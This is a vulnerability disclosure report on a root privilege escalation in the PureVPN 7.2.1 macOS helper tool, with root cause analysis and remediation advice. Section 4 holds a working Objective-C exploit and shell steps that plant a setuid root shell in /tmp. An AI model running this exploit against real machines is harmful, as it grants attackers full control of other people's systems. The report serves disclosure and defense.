# PureVPN_report

# Vulnerability Report — PureVPN macOS Privileged Helper Local Privilege Escalation
| Field | Value |
| --- | --- |
| **Title** | Unauthenticated XPC call in `com.purevpn.macapp.HelperTool` leads to arbitrary root command execution (Local Privilege Escalation) |
| **Product** | PureVPN for macOS |
| **Version** | 7.2.1 (build `9H7.0.2`) |
| **Component** | `PureVPN.app/Contents/Library/LaunchServices/com.purevpn.macapp.HelperTool` |
| **Signing** | GZ Systems Limited, team `4H849Z7V2K`, signed 2019-12-19 |
| **Vulnerability class** | Missing client authentication in privileged NSXPC listener + insecure deserialization + command injection via `NSTask` |
| **Severity** | **Critical** (CVSS ~9.3 / high-impact local privilege escalation) |
| **CWE** | CWE-306 (Missing Authentication), CWE-502 (Insecure Deserialization), CWE-78 (OS Command Injection) |
| **Related** | CVE-2018-6822 / VerSprite VS-2018-002 (same defect class) |
---
## 1. Executive summary
PureVPN 7.2.1 for macOS installs a privileged helper tool
(`com.purevpn.macapp.HelperTool`) that runs as **root** as a `LaunchDaemon`. The
tool exposes an NSXPC service over the Mach service name
`com.purevpn.macapp.HelperTool`.
The helper's `NSXPCListenerDelegate` implementation
(`listener:shouldAcceptNewConnection:`) returns `YES` **unconditionally** and
performs **no** validation of the connecting client — no audit-token check, no
code-signature check, no team-ID/entitlement requirement, and no
`AuthorizationCopyRights` gate.
Any local process, running at any UID, can therefore connect to the Mach service
and invoke the **single** method exposed by the wire protocol:
```objectivec
- (void)connectWithPaths:(NSData *)paths
           withArguments:(NSData *)withArguments
               WithReply:(void (^)(id reply))reply;
```
That method is a string-dispatched multiplexer. One of its branches
(`helperToolService_ConnectWithOvpn`) constructs an `NSTask` whose launch path
is taken directly from a caller-controlled array element (`arr[6]`) and launches
it as root. This yields **arbitrary command execution as `uid 0`** for any local
user.
---
## 2. Affected component
| Item | Detail |
| --- | --- |
| Installer | `purevpn_setup.dmg` |
| App bundle | `/Volumes/PureVPN/PureVPN.app` |
| Privileged helper | `PureVPN.app/Contents/Library/LaunchServices/com.purevpn.macapp.HelperTool` |
| Installed path | `/Library/PrivilegedHelperTools/com.purevpn.macapp.HelperTool` |
| LaunchDaemon | runs as **root** |
| Mach service | `com.purevpn.macapp.HelperTool` |
| Install mechanism | `SMJobBless` |
| Helper architecture | x86_64 Mach-O (`MH_EXECUTE`), ~178 KB |
| Build provenance (embedded source path) | `/Users/salmanahmed/…/PureVPN-Repo/purevpn-mac-app/HelperTool/HelperTool.m` |
---
## 3. Root cause analysis
### 3.1 No client verification on connection acceptance
Disassembly of `listener:shouldAcceptNewConnection:` shows the complete body is
equivalent to:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener
  shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    NSXPCInterface *iface =
      [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
    [newConnection setExportedInterface:iface];
    [newConnection setExportedObject:self];
    [newConnection resume];
    return YES;                              // <-- unconditional
}
```
There is **no** use of any of the following standard verification APIs:
- `newConnection.auditToken` / `processIdentifier`
- `SecCodeCopyGuestWithAttributes` / `SecCodeCheckValidity`
- `SecTaskCreateFromAuditToken` / `SecRequirement`
- `AuthorizationCopyRights` / `checkAuthorization:command:`
The `SMAuthorizedClients` requirement embedded in the helper's `__launchd_plist`
only constrains **who may install** the helper (the `com.purevpn.macapp.App`
bundle signed by team `4H849Z7V2K`). It does **not** constrain who may *connect*
to the Mach service at runtime.
### 3.2 Single unauthenticated entry point
The entire exported `@protocol HelperToolProtocol` contains **exactly one**
method: `connectWithPaths:withArguments:WithReply:`. All other privileged
selectors (`executeSudo:`, `execute:WithReply:`, `runWithCommand:…`,
`writeLicenseKey:authorization:withReply:`, `connectSSTP:…`, etc.) exist only as
implementation methods on the `HelperTool` class and are **not** exported.
However, they are all reachable *indirectly* through the one exported method,
which is a giant string-dispatched multiplexer.
### 3.3 Insecure deserialization
The caller-supplied `withArguments` blob is decoded with the deprecated,
non-secure API — **twice**:
```objectivec
id r13 = +[NSKeyedUnarchiver unarchiveObjectWithData:withArguments];
id arr = +[NSKeyedUnarchiver unarchiveObjectWithData:r13];
```
`unarchiveObjectWithData:` does **not** enforce `NSSecureCoding`, making this a
classic Objective-C deserialization sink (gadget chains through `NSExpression`,
`NSFunctionExpression`, `NSPredicate`, `NSInvocation`, …) that alone is
sufficient for code execution inside the root-owned helper.
### 3.4 Arbitrary process launch
The multiplexer dispatches on `arr[0]` via an `isEqual:` cascade. For the
`helperToolService_ConnectWithOvpn` branch, the helper builds a `ServerInfo`
from array slots `1..8` and then, in
`connectToOvpnUsingClientWithServer:WithReply:`, does (abridged):
```objectivec
NSTask *t = [NSTask new];
[t setLaunchPath:   serverInfo.ovpnPath];   // <-- arr[6], fully caller-controlled
[t setArguments:    argv];                  // <-- OpenVPN-style arg vector, caller-influenced
[t setCurrentDirectoryPath: ...];           // caller-influenced
[t launch];                                 // runs as root
```
Static analysis of the helper binary's `__TEXT,__cstring` section confirms the
argument vector is built from an OpenVPN template, e.g.:
```
--config  --cd  --up  --down  --auth-user-pass
--user=%@  --password=%@  --log-level  --log-stderr  --cert-warn
```
No `checkAuthorization:command:` (or any other authorization check) exists along
the `connectWithPaths:` → `connectToOvpnUsingClientWithServer:WithReply:` call
graph.

### 3.5 Other privileged operations reachable with no auth
Because every `helperToolService_…` branch dispatches from the same
unauthenticated entry point, all of the following are also callable by any local
user:
| Branch (`arr[0]`) | Effect (as root) |
| --- | --- |
| `helperToolService_ConnectWithOvpn` / `_ConnectWithSSTP` | Spawn arbitrary process (arbitrary `LaunchPath` + arguments) |
| `helperToolService_VPNServiceConfigServer` | Reconfigure system VPN + insert keychain items |
| `helperToolService_UpdateSecureDNS` | Rewrite system DNS resolver settings |
| `helperToolService_IksRule` / `_RemoveIKSRules` | Add / flush `pf` firewall rules |
| `helperToolService_InterfaceDown` / `_InterfaceUP` | Take network interfaces up/down |
| `helperToolService_KillOpenVPNProcess` / `_KillHelperToolProcess` | Terminate arbitrary / the helper process |
| `helperToolService_UnIntallHelperTool` | Remove the privileged helper (persistence tampering) |
| `helperToolService_EnableDisableIpv6Leak` | Toggle IPv6 "leak protection" system-wide |
Additionally, the binary hard-codes `system("/opt/local/sbin/shutdown.sh")` in
`+[Common setupAuthorizationDoShutdown:]` — a secondary, configuration-dependent
LPE vector if that world-writable-by-convention path is controlled by a
less-privileged user.
---
## 4. Proof of concept
### 4.1 Minimal arbitrary-command PoC (demonstrates root execution)
Connecting to the service as a normal user and invoking the single exported
method with a crafted array executes the chosen launch path as `uid 0`.

The key array layout is:
| Slot | Meaning |
| --- | --- |
| `arr[0]` | Branch selector — `helperToolService_ConnectWithOvpn` |
| `arr[1]` | `login` (unused) |
| `arr[2]` | `pass` (unused) |
| `arr[3]` | server host (`1.1.1.1`) |
| `arr[4]` | protocol (`udp`) |
| `arr[5]` | port (`1194`) |
| `arr[6]` | **`ovpnPath` → `NSTask` launch path (full control)** |
| `arr[7]` | config (unused) |
| `arr[8]` | `"30"` (misc) |
```objectivec
// purevpn_poc.m — runs <launchPath> as root via the unauthenticated XPC call
#import <Foundation/Foundation.h>
@protocol HelperToolProtocol
- (void)connectWithPaths:(NSData *)paths
           withArguments:(NSData *)withArguments
               WithReply:(void (^)(id reply))withReply;
@end
int main(void) {
  @autoreleasepool {
    NSArray *payload = @[
      @"helperToolService_ConnectWithOvpn",
      @"unused-login", @"unused-pass", @"1.1.1.1", @"udp", @"1194",
      @"/bin/sh",            // <-- ovpnPath == NSTask launchPath (root)
      @"unused-config", @"30"
    ];
    NSData *inner = [NSKeyedArchiver archivedDataWithRootObject:payload
                                          requiringSecureCoding:NO
                                                          error:NULL];
    NSData *outer = [NSKeyedArchiver archivedDataWithRootObject:inner
                                          requiringSecureCoding:NO
                                                          error:NULL];
    NSXPCConnection *conn =
      [[NSXPCConnection alloc] initWithMachServiceName:@"com.purevpn.macapp.HelperTool"
                                               options:NSXPCConnectionPrivileged];
    conn.remoteObjectInterface =
      [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
    [conn resume];
    [[conn remoteObjectProxy] connectWithPaths:nil
                                withArguments:outer
                                    WithReply:^(id r){ NSLog(@"reply: %@", r); }];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
  }
  return 0;
}
```
Compile and run as any unprivileged user:
```bash
clang -fobjc-arc -framework Foundation -framework Security purevpn_poc.m -o poc
./poc
```
### 4.2 Obtaining a persistent root shell
Because `arr[6]` (`ovpnPath`) is a fully attacker-controlled launch path, the
reliable way to obtain a reusable root shell is to point the helper at a
controlled payload rather than relying on the OpenVPN argument template. For
example, first write a setuid payload, then trigger it:
```bash
# Step 1 — payload the helper will execute as root
cat > /tmp/pwn.sh <<'EOF'
#!/bin/sh
cp /bin/sh /tmp/rootshell
chown root:wheel /tmp/rootshell
chmod 4755 /tmp/rootshell
EOF
chmod +x /tmp/pwn.sh
```
Then set `arr[6] = @"/tmp/pwn.sh"` in the PoC above and run it. Afterwards:
```bash
/tmp/rootshell -p   # root shell (setuid /bin/sh)
```
---
## 5. Impact
- **Local privilege escalation** from any unprivileged user to `root`.
- **Persistence / system tampering** — helper can rewrite DNS, firewall rules,
keychain items, network interfaces, and remove or replace the helper itself.
- **Arbitrary code execution** in a root context, both via the `NSTask` launch
and independently via the unsafe `NSKeyedUnarchiver` sink.
---
## 6. Remediation
1. **Authenticate the connecting client.** In
`listener:shouldAcceptNewConnection:`, read `newConnection.auditToken`, build
a `SecCode` via `SecCodeCopyGuestWithAttributes`, and validate it against a
`SecRequirement` pinning the legitimate client, e.g.
    
    ```
    anchor apple generic and identifier "com.purevpn.macapp.App"
      and certificate leaf[subject.OU] = "4H849Z7V2K"
    ```
    
    Return `NO` otherwise.
    
2. **Replace insecure deserialization.** Substitute
`+[NSKeyedUnarchiver unarchivedObjectOfClasses:fromData:error:]` with an
explicit allow-list (e.g. `NSArray`, `NSString`, `NSNumber`) for
`+[NSKeyedUnarchiver unarchiveObjectWithData:]`.
3. **Authorize privileged operations individually.** Require an
`AuthorizationRef` from the caller for every privileged sub-operation and
validate it with `AuthorizationCopyRights` against rights that require user
authentication — rather than a single unauthenticated dispatcher.
4. **Harden the `shutdown.sh` path** (remove / restrict the hard-coded
`system("/opt/local/sbin/shutdown.sh")` call).
---
## 7. References
- VerSprite VS-2018-002 / CVE-2018-6822 (same defect class):
https://github.com/VerSprite/research/blob/master/exploits/VS-2018-002/README.md
- Apple, "EvenBetterAuthorizationSample" (reference implementation for secure
privileged NSXPC helpers).
- Apple, `NSSecureCoding` / `NSKeyedUnarchiver` secure-coding guidance.
---
## Appendix — binary facts (independently verified)
The DMG was extracted (UDIF `koly` trailer → `blkx` zlib blocks → Apple_HFS
partition) and the helper was recovered as an x86_64 Mach-O executable
(`MH_EXECUTE`), 178,656 bytes, with segments `__TEXT` (110,592 B), `__DATA`
(24,576 B) and `__LINKEDIT` (43,488 B). Its `__TEXT,__cstring` section contains
the selector `connectWithPaths:withArguments:WithReply:`, the branch strings
`helperToolService_ConnectWithOvpn` (and the rest of the dispatch table), the
`NSTask` API symbols, and the OpenVPN argument template strings
(`--config`, `--cd`, `--up`, `--down`, `--auth-user-pass`, `--user=%@`,
`--password=%@`, `--log-level`, `--log-stderr`, `--cert-warn`), plus
`/usr/sbin/pppd`, `/usr/sbin/racoon`, `/sbin/pfctl`, `/bin/launchctl`, and the
hard-coded `/opt/local/sbin/shutdown.sh`.
